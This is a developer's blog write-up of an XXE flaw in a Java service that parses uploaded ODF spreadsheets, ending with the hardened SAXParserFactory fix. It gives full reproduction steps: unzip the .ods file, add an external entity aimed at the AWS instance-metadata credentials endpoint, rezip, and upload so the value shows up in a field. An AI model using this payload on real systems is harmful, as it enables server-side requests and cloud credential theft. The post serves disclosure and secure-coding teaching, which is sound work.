---
title: "Hiding XXE in Spreadsheets"
date: 2018-06-08T12:24:08+01:00
tags: ["security", "xml-is-evil"]
featured_image: "/images/hiding_xxe_in_spreadsheets_title.jpg"
---

Recently I tried to poke holes in a service.  I found myself [laughing out loud]({{< ref "/posts/laughing_out_loud_malicious_auth.md" >}}). 
This was a vulnerability whereby modifying a SAML authentication while being rePOSTed via the browser allowed 
me to inject a malicious payload (see [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing) 
and [XML External Entity (XXE) Prevention Cheat Sheet](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)) 
that could be used to use up a service's memory and CPU.  Health checks and automatic service restarts would have 
healed the service but it still would have allowed an attacker to mount a Denial of Service attack without 
needing a lot of requests.

# Finding the Issue

Subsequently, I identified a number of services that needed to be fixed, and while I was fixing services I used the 
following regular expression to find other possible weaknesses:

```shell script
SAXBuilder|SAXReader|XMLReader|SAXTransformerFactory|SchemaFactory|TransformerFactory|XMLInputFactory|DocumentBuilderFactory|SAXParserFactory
```

This lead me to find the following code snippet in a class called WorksheetParser

```java
public WorksheetParser() throws ParserConfigurationException, SAXException
{
  SAXParserFactory factory = SAXParserFactory.newInstance();

  factory.setNamespaceAware(true);
  factory.setValidating(true);

  this.saxParser = factory.newSAXParser();
}
```

and `WorksheetParser` was used to parse ODF spreadsheets (OpenOffice spreadsheets).

In this app, "worksheet"s were used so that organisations can use a simple spreadsheet to collect their information and 
upload it.  The app parsed the information and played it back to the user.

Now, this got me thinking - as the ODF file format is just a ZIP file with XML content - and I had just found an 
unsecured `SAXParserFactory`, how difficult would it be to exploit that?

# The Exploit

So I got the spreadsheet and opened it up in LibreOffice and I filled in some basic data including first name and 
last name and saved the file.

Then I unzipped it

```shell script
$ mkdir xxe_bomb
$ cd xxe_bomb
$ unzip ../template_filled_in.ods
Archive:  ../template_filled_in.ods
 extracting: mimetype               
  inflating: styles.xml             
  inflating: META-INF/manifest.xml  
  inflating: content.xml            
  inflating: meta.xml               
 extracting: media/image1.png
```

then I just edited the content.xml file and added

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE xxe-root [
        <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
```

then I looked for the last name that I entered ("Doe") - and replaced it with &xxe;

Then it was just a matter of zipping it back up again as my new payload file

```shell script
$ zip ../xxe_bomb.ods *
  adding: META-INF/ (stored 0%)
  adding: content.xml (deflated 98%)
  adding: media/ (stored 0%)
  adding: meta.xml (deflated 57%)
  adding: mimetype (deflated 4%)
  adding: styles.xml (deflated 79%)
```

Then once I had uploaded the file and the app played back the last name - I was able to get the IAM role...

# Limitations

The exploit was somewhat limited because the app validated the last name, and if there are unknown characters 
(like '{' or '}') an error would be displayed. So I wasn't able to extract the AWS keys by setting the payload to:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE xxe-root [
        <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-server-role">
]>
```

as per [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html#instance-metadata-security-credentials](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html#instance-metadata-security-credentials)

Also those credentials would have been somewhat limited as they were locked down.

However, with enough knowledge of the system and the ability to execute arbitrary GET requests, I believe quite a 
bit of damage could have been done.

# The Fix

The offending class was changed to

```java
public WorksheetParser() throws ParserConfigurationException, SAXException
{
  SAXParserFactory factory = SAXParserFactory.newInstance();
  factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
  factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
  factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
  factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
  factory.setXIncludeAware(false);
  factory.setNamespaceAware(true);
  factory.setValidating(true);

  this.saxParser = factory.newSAXParser();
}
```

as per the [OWASP XXE Prevention Cheat Sheet](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#JAXP_DocumentBuilderFactory.2C_SAXParserFactory_and_DOM4J).

# Moral of the Story

*   Malicious XXE payloads can hidden in files that do not have the XML extension
*   Do not assume that XML processing is safe by default (particular when using older libraries) 
*   XML is evil
